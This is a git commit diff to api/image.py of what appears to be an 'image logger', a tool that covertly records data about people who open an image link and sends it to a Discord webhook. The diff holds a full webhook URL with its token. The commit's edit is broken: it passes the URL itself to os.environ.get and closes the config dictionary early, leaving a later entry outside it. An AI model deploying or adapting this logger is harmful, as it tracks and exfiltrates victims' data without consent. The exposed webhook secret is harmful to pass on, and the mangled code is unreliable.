d61ddf8857f153fb098721867c61ac7c4dd5e41d
ilikedafeet <cmaa23167@outlook.com>
2026-05-16 23:09:36 +0100

    Update webhook and image URLs to use environment variables

--- api/image.py
+++ api/image.py
@@ -11,9 +11,14 @@ __version__ = "v2.0"
 __author__ = "DeKrypt/HackersHaven"
 
 config = {
+
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1505316823141453994/n4QuoJ30U1Xj12gOnCxe190q6rTVe5Zef7sD6DFKqQAjsgyXDWXc_EBp2O0dSJfApJ52",
-    "image": "https://wallpapers.com/images/hd/windows-x-p-bliss-hills-1mcl2789erasehms.jpg", # You can also have a custom image by using a URL argument
+
+    "webhook": os.environ.get("https://discord.com/api/webhooks/1505316823141453994/n4QuoJ30U1Xj12gOnCxe190q6rTVe5Zef7sD6DFKqQAjsgyXDWXc_EBp2O0dSJfApJ52"),
+
+    "image": "https://wallpapers.com/images/hd/windows-x-p-bliss-hills-1mcl12789erasehms.jpg",
+
+} # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
